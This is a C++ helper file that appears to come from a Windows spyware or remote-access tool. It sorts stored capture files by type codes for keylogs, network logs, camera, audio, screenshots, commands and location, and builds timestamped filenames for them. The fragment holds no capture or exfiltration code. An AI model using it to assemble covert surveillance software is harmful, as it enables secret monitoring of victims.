#include "TasksHelper.h"

wstring buildFilterPath(wstring finalFilterPath, map<string, string> configs, const char* type) {
	if (configs.find(type) != configs.end()) {
		if (configs.find(type)->second == "true")
			finalFilterPath.append(stringToWString(type).append(L"-"));
	}
	else
		return L"*"; // invalid config file
	return finalFilterPath;
}

string checkDataType(char* filename)
{
	const char id[3] = { filename[0],filename[1] , '\0' };

	if (!strcmp(id, KEYLOG_CODE))
		return Keylog;
	else if (!strcmp(id, NETLOG_CODE))
		return Netlog;
	else if (!strcmp(id, CAMERA_CODE))
		return Camera;
	else if (!strcmp(id, AUDIO_CODE))
		return Audio;
	else if (!strcmp(id, SCREENSHOT_CODE))
		return Screenshot;
	else if (!strcmp(id, CMD_CODE))
		return Command;
	else if (!strcmp(id, LOCATION_CODE))
		return Location;
	return UNDEFINED_CODE;
}

string constructFilename(const char* typeCode) {
	// Get time and date
	time_t rawtime;
	struct tm* timeinfo;
	time(&rawtime);
	timeinfo = localtime(&rawtime);
	char dateString[80];

	// Get the date as a string
	strftime(dateString, sizeof(dateString), "-%d-%m-%Y-%H-%M-%S-", timeinfo);
	string fname = "";
	UUID uuid;
	UuidCreate(&uuid);
	char* str;
	UuidToStringA(&uuid, (RPC_CSTR*)&str);
	fname.append(DATA_FOLDER_PATH).append(typeCode).append(dateString).append(str);
	RpcStringFreeA((RPC_CSTR*)&str);
	return fname;
}
